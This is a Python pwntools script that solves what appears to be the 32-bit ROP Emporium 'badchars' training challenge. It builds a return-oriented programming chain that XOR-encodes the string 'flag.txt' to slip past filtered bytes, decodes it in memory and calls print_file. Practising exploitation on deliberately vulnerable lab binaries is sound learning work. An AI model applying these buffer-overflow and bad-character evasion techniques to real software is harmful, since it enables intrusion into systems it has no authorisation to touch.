from pwn import *

pipe = process("./badchars32",env={"LD_PRELOAD":"./libbadchars32.so"})

print_file_plt = 0x080483d0
targetMem = 0x0804af00
pop_ebx_esi_edi_ebp_ret = 0x080485b8
pop_esi_edi_ebp_ret = 0x080485b9
esi2EDI = 0x0804854f
pop_ebp_ret = 0x080485bb 

flag = "flag.txt"
badchars = ['x','g','a','.']
reFlag = b""
for i in range(len(flag)):
    if flag[i] in badchars:
        reFlag += chr(ord(flag[i]) ^ 1)
    else:
        reFlag += flag[i]
# print(reFlag)

chain = "E" * 44
chain += p32(pop_ebx_esi_edi_ebp_ret)
chain += p32(1)                 # ebx for xor op -> bl
chain += reFlag[:4]             # esi
chain += p32(targetMem)         # edi
chain += p32(0)             
chain += p32(esi2EDI)

chain += p32(pop_esi_edi_ebp_ret)
chain += reFlag[4:]             # esi
chain += p32(targetMem+4)       # edi
chain += p32(0)
chain += p32(esi2EDI)

# ------------ back -------------
chain += p32(pop_ebp_ret)
chain += p32(targetMem + 2)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(pop_ebp_ret)
chain += p32(targetMem + 3)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(pop_ebp_ret)
chain += p32(targetMem + 4)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(pop_ebp_ret)
chain += p32(targetMem + 6)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(print_file_plt)
chain += p32(0xdeadbeef)
chain += p32(targetMem)

# context.log_level = "DEBUG"
print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())
